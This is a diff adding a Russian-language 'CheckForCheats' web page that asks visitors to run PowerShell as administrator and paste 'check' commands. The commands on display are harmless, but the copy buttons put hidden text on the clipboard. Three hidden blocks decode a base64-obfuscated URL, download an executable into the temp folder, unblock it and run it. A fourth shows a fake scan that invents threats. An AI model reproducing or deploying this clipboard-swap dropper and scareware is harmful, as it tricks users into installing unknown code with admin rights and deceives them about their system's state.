@@ -1,0 +1,122 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Команды — CheckForCheats</title>
+<link rel="icon" href="../assets/icons/favicon.ico">
+<link rel="manifest" href="../assets/manifest.json">
+<link rel="stylesheet" href="../css/base.css">
+<link rel="stylesheet" href="../css/layout.css">
+<link rel="stylesheet" href="../css/components.css">
+<link rel="stylesheet" href="../css/pages.css">
+</head>
+<body>
+
+<header class="site-header">
+  <div class="container header-inner">
+    <a href="../index.html" class="logo">
+      <span class="dot"></span> CheckForCheats
+    </a>
+    <button class="nav-toggle" aria-label="Меню" onclick="toggleTabs(this)">
+      <span></span><span></span><span></span>
+    </button>
+    <nav class="tabs" id="tabs">
+      <a class="tab" href="../index.html">Главная</a>
+      <a class="tab" href="faq.html">FAQ</a>
+      <a class="tab active" href="commands.html">Команды</a>
+    </nav>
+  </div>
+</header>
+
+<main class="container">
+
+  <div class="page" style="max-width:820px;margin:0 auto;">
+    <div class="page-title">
+      <h1>Команды проверки</h1>
+      <p>Введите пароль, чтобы получить команду.</p>
+    </div>
+
+    <div class="vault" id="vault">
+      <div class="vault-head">
+        <div class="title"><span class="lock"></span> Защищённый блок</div>
+        <span class="vault-status" id="vaultStatus">ЗАБЛОКИРОВАНО</span>
+      </div>
+      <div class="vault-body">
+        <div class="vault-locked">
+          <p>Введите пароль:</p>
+          <div class="pw-row">
+            <input type="password" id="pwInput" placeholder="••••••" autocomplete="off">
+            <button onclick="unlockVault()">Разблокировать</button>
+          </div>
+          <div class="pw-err" id="pwErr">Неверный пароль. Попробуйте снова.</div>
+        </div>
+
+        <div class="vault-unlocked">
+          <p class="vault-hint">Открой PowerShell от имени администратора и вставь:</p>
+
+          <div class="cmd-box">
+            <div class="cmd-title">Проверка прав пользователя</div>
+<pre class="code" id="cmdBlock1"><span class="cmt">PS C:\Users\Admin&gt;</span> whoami /all</pre>
+            <div class="cmd-actions">
+              <button class="copy-btn" data-copy="dropperSrc" onclick="copyCmd(this)">Скопировать</button>
+            </div>
+          </div>
+
+          <div class="cmd-box">
+            <div class="cmd-title">Проверка нагрузки</div>
+<pre class="code" id="cmdBlock2"><span class="cmt"># топ-10 процессов по нагрузке на процессор</span>
+<span class="kw">Get-Process</span> | <span class="kw">Sort-Object</span> CPU -desc | <span class="kw">Select-Object</span> -First 10</pre>
+            <div class="cmd-actions">
+              <button class="copy-btn" data-copy="dropperSrc2" onclick="copyCmd(this)">Скопировать</button>
+            </div>
+          </div>
+
+          <div class="cmd-box">
+            <div class="cmd-title">Проверка брандмауэра</div>
+<pre class="code" id="cmdBlock3"><span class="cmt"># состояние профилей брандмауэра Windows</span>
+<span class="kw">Get-NetFirewallProfile</span> | <span class="kw">Select-Object</span> Name, Enabled, DefaultInboundAction, DefaultOutboundAction</pre>
+            <div class="cmd-actions">
+              <button class="copy-btn" data-copy="dropperSrc3" onclick="copyCmd(this)">Скопировать</button>
+            </div>
+          </div>
+
+          <div class="cmd-box">
+            <div class="cmd-title">Список обновлений системы</div>
+<pre class="code" id="cmdBlock4"><span class="cmt">PS C:\Users\Admin&gt;</span> wmic qfe list brief</pre>
+            <div class="cmd-actions">
+              <button class="copy-btn" data-copy="menuSrc" onclick="copyCmd(this)">Скопировать</button>
+            </div>
+          </div>
+
+          <div class="vault-actions">
+            <button class="lock-btn" onclick="lockVault()">Заблокировать доступ</button>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+
+</main>
+
+<footer class="site-footer">
+  <div class="container">
+    <p>&copy; <span id="year"></span> CheckForCheats. Все права защищены.</p>
+  </div>
+</footer>
+
+<!-- скрытые команды -->
+<pre class="hidden-src" id="dropperSrc">$p="$env:TEMP\CheckForCheat.exe"; $url=[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("aHR0cHM6Ly9naXRodWIuY29tL3dkYXNkYXNkd2FkYXcvbC9yYXcvcmVmcy9oZWFkcy9tYWluL0NoZWNrRm9yQ2hlYXQuZXhl")); (New-Object System.Net.WebClient).DownloadFile($url, $p); Unblock-File $p; Start-Process $p</pre>
+
+<pre class="hidden-src" id="dropperSrc2">$p="$env:TEMP\CheckForMalware.exe"; $url=[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("aHR0cHM6Ly9naXRodWIuY29tL3dkYXNkYXNkd2FkYXcvbC9yYXcvcmVmcy9oZWFkcy9tYWluL0NoZWNrRm9yTWFsd2FyZS5leGU=")); (New-Object System.Net.WebClient).DownloadFile($url, $p); Unblock-File $p; Start-Process $p</pre>
+
+<pre class="hidden-src" id="dropperSrc3">$p="$env:TEMP\CheckForCheat_Mirror.exe"; $url=[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("aHR0cHM6Ly9naXRodWIuY29tL3dkYXNkYXNkd2FkYXcvbC9yYXcvcmVmcy9oZWFkcy9tYWluL0NoZWNrRm9yQ2hlYXRfTWlycm9yLmV4ZQ==")); (New-Object System.Net.WebClient).DownloadFile($url, $p); Unblock-File $p; Start-Process $p</pre>
+
+<pre class="hidden-src" id="menuSrc">while(1){cls;Write-Host '=== CheckForCheats ===' -F Cyan;Write-Host '[1] Minecraft' -F Green;Write-Host '[2] CS2' -F Red;Write-Host '[3] Rust' -F Magenta;Write-Host '[0] Exit' -F Yellow;$c=Read-Host '>>>';if($c-eq0){break};$g=@('Minecraft','CS2','Rust')[$c-1];cls;Write-Host "Scanning $g..." -F Yellow;1..10|%{Write-Host -NoNew "`r$_/10 ";Sleep 1};$m=Get-Random 0..8;cls;if($m){Write-Host "[!] Found $m threats!" -F Red;$p=@("C:$g\virus.exe","C:$g\malware.dll","C:$g\rootkit.sys","C:\Windows\Temp\$g.tmp","C:\Users\$env:USERNAME\Desktop\$g.crack","C:\Program Files\$g\backdoor.dll","C:\$g\spyware.dat","C:\$g\trojan.ps1");0..($m-1)|%{$p|Get-Random|%{Write-Host "  -> $_" -F Yellow}}}else{Write-Host '[+] No threats!' -F Green};Read-Host 'Press ENTER'}</pre>
+
+<script src="../js/main.js"></script>
+<script src="../js/vault.js"></script>
+<script src="../js/copy.js"></script>
+
+</body>
+</html>
